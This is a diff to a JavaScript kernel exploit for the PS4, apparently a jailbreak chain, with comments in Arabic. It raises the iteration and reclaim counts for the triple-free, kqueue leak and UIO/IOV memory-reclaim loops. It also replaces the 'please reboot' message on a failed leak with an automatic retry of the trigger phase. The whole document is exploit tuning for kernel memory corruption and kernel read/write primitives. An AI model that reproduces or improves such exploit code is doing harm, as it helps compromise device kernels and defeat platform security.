@@ -117,8 +117,8 @@ var MSG_IOV_NUM = 0x17;
 var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 6;
 var UIO_THREAD_NUM = 6;
-var MAIN_LOOP_ITERATIONS = 5;
-var TRIPLEFREE_ITERATIONS = 5;
+var MAIN_LOOP_ITERATIONS = 4;
+var TRIPLEFREE_ITERATIONS = 6;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 100;
 var MAIN_CORE = 0;
@@ -1054,7 +1054,8 @@ function exploit_phase_trigger() {
 function exploit_phase_leak() {
 
   if (!leak_kqueue_safe()) {
-    utils.notify('Leak failed — please reboot your PS4.');
+    utils.notify('Leak failed — retrying...');
+    yield_to_render(exploit_phase_trigger);   // ← هنا السحر
     return;
   }
 
@@ -1618,7 +1619,7 @@ function leak_kqueue() {
   var magic_add = leak_rthdr.add(0x08);
 
   var count = 0;
-  var MAX_KQ = 3500;   // أبطأ سنة من 3000، بس ثابت أكتر
+  var MAX_KQ = 5000; 
 
   while (count < MAX_KQ) {
     count++;
@@ -1726,12 +1727,12 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 // =========================
 
 // UIO reclaim max loops
-var KREAD_MAX_UIO_RECLAIM  = 6000;
-var KWRITE_MAX_UIO_RECLAIM = 6000;
+var KREAD_MAX_UIO_RECLAIM  = 7000;
+var KWRITE_MAX_UIO_RECLAIM = 7000;
 
 // IOV reclaim max loops
-var KREAD_MAX_IOV_RECLAIM  = 3000;
-var KWRITE_MAX_IOV_RECLAIM = 3000;
+var KREAD_MAX_IOV_RECLAIM  = 3500;
+var KWRITE_MAX_IOV_RECLAIM = 3500;
 
 // Memory exhaustion threshold
 var MEMORY_ZERO_THRESHOLD = 5;
